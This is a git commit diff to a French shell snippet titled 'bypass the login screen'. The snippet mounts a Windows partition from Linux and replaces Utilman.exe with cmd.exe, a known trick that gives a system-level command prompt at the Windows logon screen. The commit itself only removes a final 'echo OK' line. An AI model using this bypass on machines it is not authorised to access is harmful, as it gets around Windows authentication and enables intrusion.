eedbccbf1798a2868607ef00b3a6d376c5776178
Mickaël Schoentgen <contact@tiger-222.fr>
2024-10-31 21:39:10 +0100

    tweak: outrepasser-ecran-de-connexion

--- sources/windows/snippets/outrepasser-ecran-de-connexion.sh
+++ sources/windows/snippets/outrepasser-ecran-de-connexion.sh
@@ -6,5 +6,4 @@ mount -t ntfs3 /dev/sdaX /mnt/windows
 
 cd /mnt/windows/Windows/System32 \
     && mv -v Utilman.exe Utilman.exe.or \
-    && cp -v cmd.exe Utilman.exe \
-    && echo 'OK'
+    && cp -v cmd.exe Utilman.exe
